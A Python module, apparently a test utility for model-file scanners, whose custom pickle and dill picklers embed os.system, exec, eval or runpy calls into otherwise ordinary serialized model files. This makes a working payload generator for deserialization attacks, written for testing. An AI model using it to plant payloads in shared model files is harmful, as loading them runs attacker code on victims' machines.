"""CodeInjection Utility.

This module contains examples of code injection using the `pickle` and `dill` libraries.
This is used for testing and demonstrative purposes.
"""

from __future__ import annotations

import os
import pickle
import struct
from typing import TYPE_CHECKING, Any

import dill

if TYPE_CHECKING:
    from _typeshed import SupportsWrite


class PickleInject:
    """Pickle injection"""

    def __init__(self, inj_objs: Any, first: bool = True):
        self.__name__ = "pickle_inject"
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(pickle._Pickler):
        """Re-implementation of Pickler with support for injection"""

        def __init__(
            self,
            file: SupportsWrite[bytes],
            protocol: int | None,
            inj_objs: Any,
            first: bool = True,
        ) -> None:
            """
            file: File object with write attribute
            protocol: Pickle protocol - Currently the default protocol is 4: https://docs.python.org/3/library/pickle.html
            inj_objs: _joblibInject object that has both the command, and the code to be injected
            first: Boolean object to determine if inj_objs should be serialized before the safe file or after the safe file.
            """
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj: Any) -> None:
            """Pickle data, inject object before or after"""
            if self.proto >= 2:  # type: ignore[attr-defined]
                self.write(pickle.PROTO + struct.pack("<B", self.proto))  # type: ignore[attr-defined]
            if self.proto >= 4:  # type: ignore[attr-defined]
                self.framer.start_framing()  # type: ignore[attr-defined]

            # Inject the object(s) before the user-supplied data?
            if self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)  # type: ignore[attr-defined]

            # Pickle user-supplied data
            self.save(obj)  # type: ignore[attr-defined]

            # Inject the object(s) after the user-supplied data?
            if not self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)  # type: ignore[attr-defined]

            self.write(pickle.STOP)  # type: ignore[attr-defined]
            self.framer.end_framing()  # type: ignore[attr-defined]

    def Pickler(self, file: Any, protocol: Any) -> _Pickler:
        # Initialise the pickler interface with the injected object
        return self._Pickler(file, protocol, self.inj_objs)


class _PickleInject:
    """Base class for pickling injected commands."""

    def __init__(self, args: str, command: Any | None = None) -> None:
        self.command = command
        self.args = args

    def __reduce__(self) -> tuple[Any, tuple[str, ...]]:
        """
        Specify how to serialize objects.

        This is a special method used by pickle.
        If defined for an object, pickle would override its default __reduce__ function and serialize the object as outlined by the custom specified __reduce__ function,
        The object returned by __reduce__ here is a callable: (self.command), and the tuple: with first element (self.args) is the code to be executed by self.command.
        """
        return self.command, (self.args,)


class SystemInject(_PickleInject):
    """Create os.system command"""

    def __init__(self, args: str) -> None:
        super().__init__(args, command=os.system)


class ExecInject(_PickleInject):
    """Create exec command."""

    def __init__(self, args: str) -> None:
        super().__init__(args, command=exec)


class EvalInject(_PickleInject):
    """Create eval command."""

    def __init__(self, args: str) -> None:
        super().__init__(args, command=eval)


class RunPyInject(_PickleInject):
    """Create runpy command."""

    def __init__(self, args: str) -> None:
        import runpy  # pylint: disable=import-outside-toplevel

        super().__init__(args, command=runpy._run_code)  # type: ignore

    def __reduce__(self) -> tuple[Any, ...]:
        return self.command, (self.args, {})


def get_inject_payload(
    command: str, malicious_code: str
) -> SystemInject | ExecInject | EvalInject | RunPyInject:
    """Get the payload for the pickle injection.

    Args:
        command: The command to be injected.
        malicious_code: The code to be injected.

    Returns:
        PickleInject object.

    Raises:
        ValueError: If the command is not supported.
    """
    if command == "system":
        return SystemInject(malicious_code)
    if command == "exec":
        return ExecInject(malicious_code)
    if command == "eval":
        return EvalInject(malicious_code)
    if command == "runpy":
        return RunPyInject(malicious_code)
    else:
        raise ValueError(f"Invalid command: {command}")


def generate_unsafe_pickle_file(
    safe_model: Any, command: str, malicious_code: str, unsafe_model_path: str
) -> None:
    """Create an unsafe pickled file with injected code.

    Args:
        safe_model: Safe model to be pickled.
        command: The command to be injected.
        malicious_code: The malicious to be injected.
        unsafe_model_path: Path to save the unsafe model.
    """
    payload = get_inject_payload(command, malicious_code)
    pickle_protocol = 4
    with open(unsafe_model_path, "wb") as f:
        mypickler = PickleInject._Pickler(
            f, pickle_protocol, [payload]
        )  # pylint: disable=protected-access
        mypickler.dump(safe_model)


class DillInject:
    """Code injection using Dill Pickler"""

    def __init__(self, inj_objs: Any, first: bool = True):
        self.__name__ = "dill_inject"
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(dill._dill.Pickler):  # type: ignore[misc]
        """Reimplementation of Pickler with support for injection"""

        def __init__(
            self,
            file: SupportsWrite[bytes],
            protocol: int | None,
            inj_objs: Any,
            first: bool = True,
        ):
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj: Any) -> None:
            """Pickle data, inject object before or after"""
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.proto >= 4:
                self.framer.start_framing()

            # Inject the object(s) before the user-supplied data?
            if self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            # Pickle user-supplied data
            self.save(obj)

            # Inject the object(s) after the user-supplied data?
            if not self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.write(pickle.STOP)
            self.framer.end_framing()

    def DillPickler(self, file: Any, protocol: Any) -> _Pickler:
        # Initialise the pickler interface with the injected object
        return self._Pickler(file, protocol, self.inj_objs)


def generate_dill_unsafe_file(
    safe_model: Any, command: str, malicious_code: str, unsafe_model_path: str
) -> None:
    payload = get_inject_payload(command, malicious_code)
    pickle_protocol = 4

    with open(unsafe_model_path, "wb") as f:
        mypickler = DillInject._Pickler(
            f, pickle_protocol, [payload]
        )  # pylint: disable=protected-access
        mypickler.dump(safe_model)
